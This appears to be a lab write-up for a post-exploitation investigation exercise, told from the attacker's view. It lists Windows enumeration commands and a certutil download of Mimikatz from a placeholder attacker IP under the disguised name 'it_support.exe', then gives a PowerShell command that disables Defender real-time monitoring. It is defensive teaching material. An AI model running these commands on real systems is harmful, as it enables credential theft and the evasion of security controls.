# Post-Exploitation Incident Investigation

## Context
We detect post-exploitation activity on one of our VMs. We are tasked with investigating the following points:
1. Whether this is a false or true positive
2. If true, the actions taken by the threat actor
3. The impact and evidence of further compromise

## Attacker's Perspective
As the attacker, we gained local admin access via RDP to a Windows VM hosted on a company's Azure cloud network. With this acces, our goal is to enumerate as much as possible and find any information that can help in lateral movement or further compromise of the network. 

#### 1. Basic Enumeration
We first get a lay of the land by doing some basic enumeration using the following commands:
- `whoami`
- `whoami /priv`
- `tasklist /svc`
- `netstat antp`
- `whoami /groups`

<img width="1664" height="934" alt="image" src="https://github.com/user-attachments/assets/e400704e-7f64-4fcd-aa9c-739dd700a9c9" />

<img width="1678" height="1082" alt="image" src="https://github.com/user-attachments/assets/bd7e0b54-8842-43d6-8601-a9c4bc80964d" />

#### 2. Download Script From Attacker Machine
We discover that we are a part of the Administrator group! We now proceed to transfer over Mimikatz, a super popular, open-source credential extracting tool, from our local attacker machine to the compromised VM. 

To do this, we'll first start up a web server on our attacker's local machine using Python:
1. Get local IP: `ifconfig`
2. Start Python web server: `python3 -m http.server 8080`

Next, we'll use the native Windows tool, `certutil` to download the `mimikatz.exe` file:

` certutil -urlcache -f http://[ATTACKER_IP]:8080/mimikatz.exe it_support.exe`

<img width="1480" height="282" alt="image" src="https://github.com/user-attachments/assets/6cab6048-f69c-4bd1-bce3-7e51f8b5b56e" />

<img width="942" height="870" alt="image" src="https://github.com/user-attachments/assets/64036c7b-8e63-48db-8c57-ac57ab895308" />

We're stopped by the antivirus. Let's disable it and try again using this PowerShell command:

`Set-MpPreference -DisableRealtimeMonitoring $true`

<img width="1476" height="740" alt="image" src="https://github.com/user-attachments/assets/5b5d5d82-c022-47d8-a667-733b740a289b" />



